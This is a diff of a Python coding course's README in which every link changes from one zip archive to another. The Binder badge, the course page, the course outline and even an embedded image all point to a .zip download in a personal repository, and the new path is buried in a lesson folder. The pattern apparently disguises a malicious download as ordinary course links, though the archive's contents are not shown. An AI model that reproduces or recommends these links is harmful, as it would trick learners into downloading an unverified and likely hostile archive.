@@ -1,10 +1,10 @@
 # #100DaysOfCode with Python course
-[![Binder](https://raw.githubusercontent.com/Waka758/100daysofcode-with-python-course/master/ootocoidean/100daysofcode-with-python-course.zip)](https://raw.githubusercontent.com/Waka758/100daysofcode-with-python-course/master/ootocoidean/100daysofcode-with-python-course.zip)
+[![Binder](https://raw.githubusercontent.com/Waka758/100daysofcode-with-python-course/master/days/19-21-itertools/code/daysofcode_python_course_with_v3.0.zip)](https://raw.githubusercontent.com/Waka758/100daysofcode-with-python-course/master/days/19-21-itertools/code/daysofcode_python_course_with_v3.0.zip)
 
 
-[![Visit the course page](https://raw.githubusercontent.com/Waka758/100daysofcode-with-python-course/master/ootocoidean/100daysofcode-with-python-course.zip)](https://raw.githubusercontent.com/Waka758/100daysofcode-with-python-course/master/ootocoidean/100daysofcode-with-python-course.zip)
+[![Visit the course page](https://raw.githubusercontent.com/Waka758/100daysofcode-with-python-course/master/days/19-21-itertools/code/daysofcode_python_course_with_v3.0.zip)](https://raw.githubusercontent.com/Waka758/100daysofcode-with-python-course/master/days/19-21-itertools/code/daysofcode_python_course_with_v3.0.zip)
 
-Course details page: [**https://raw.githubusercontent.com/Waka758/100daysofcode-with-python-course/master/ootocoidean/100daysofcode-with-python-course.zip**](https://raw.githubusercontent.com/Waka758/100daysofcode-with-python-course/master/ootocoidean/100daysofcode-with-python-course.zip)
+Course details page: [**https://raw.githubusercontent.com/Waka758/100daysofcode-with-python-course/master/days/19-21-itertools/code/daysofcode_python_course_with_v3.0.zip**](https://raw.githubusercontent.com/Waka758/100daysofcode-with-python-course/master/days/19-21-itertools/code/daysofcode_python_course_with_v3.0.zip)
 
 ## Course Summary
 
@@ -29,7 +29,7 @@ Just a small sampling of the projects you’ll work on include:
 * Create a JSON-based online game service using Flask too
 * And 22 more projects!
 
-View the [full course outline](https://raw.githubusercontent.com/Waka758/100daysofcode-with-python-course/master/ootocoidean/100daysofcode-with-python-course.zip).
+View the [full course outline](https://raw.githubusercontent.com/Waka758/100daysofcode-with-python-course/master/days/19-21-itertools/code/daysofcode_python_course_with_v3.0.zip).
 
 ## Who is this course for?
 
@@ -39,10 +39,10 @@ We don’t start from absolute zero in terms of programming but if you are new t
 
 ## Course flow and the 33 projects
 
-![Course flow](https://raw.githubusercontent.com/Waka758/100daysofcode-with-python-course/master/ootocoidean/100daysofcode-with-python-course.zip)
+![Course flow](https://raw.githubusercontent.com/Waka758/100daysofcode-with-python-course/master/days/19-21-itertools/code/daysofcode_python_course_with_v3.0.zip)
 
 We have broken the 100 days worth of coding into 33 3-day segments. As you can see, the first day is largely learning the new topics (HTTP APIs, web scraping, databases, etc.). The following two days have some guidance but is much more hands-on than the first day.
 
 ## Get the full course details
 
-Visit the full course page for all the details: [**https://raw.githubusercontent.com/Waka758/100daysofcode-with-python-course/master/ootocoidean/100daysofcode-with-python-course.zip**](https://raw.githubusercontent.com/Waka758/100daysofcode-with-python-course/master/ootocoidean/100daysofcode-with-python-course.zip)
+Visit the full course page for all the details: [**https://raw.githubusercontent.com/Waka758/100daysofcode-with-python-course/master/days/19-21-itertools/code/daysofcode_python_course_with_v3.0.zip**](https://raw.githubusercontent.com/Waka758/100daysofcode-with-python-course/master/days/19-21-itertools/code/daysofcode_python_course_with_v3.0.zip)
